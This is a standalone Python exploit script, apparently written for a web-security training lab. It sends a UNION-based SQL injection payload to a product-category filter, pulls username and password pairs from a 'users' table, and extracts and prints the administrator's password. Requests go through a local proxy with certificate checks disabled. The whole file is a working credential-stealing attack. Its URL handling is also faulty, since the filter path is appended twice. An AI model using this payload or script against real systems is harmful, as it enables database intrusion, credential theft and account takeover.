import sys
import requests
import urllib3
from bs4 import BeautifulSoup as bs
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit(url):
    path = '/filter?category='
    sql_payload = "' UNION select NULL, username || '*' || password from users--"
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    res = r.text
    if "administrator" in res:
        print("[+] Found the administrator password...")
        soup = bs(r.text, 'html.parser')
        admin_password = soup.find(string=re.compile('.*administrator.*')).split("*")[1]
        print("[+] The administrator password is '%s'." % admin_password)
        return True
    
def main():
    try:
        url = sys.argv[1] + "filter?category="
        exploit(url)
    except IndexError:
        print("Usage: %s <url>" % sys.argv[0])
        sys.exit(-1)

if __name__ == '__main__':
    main()
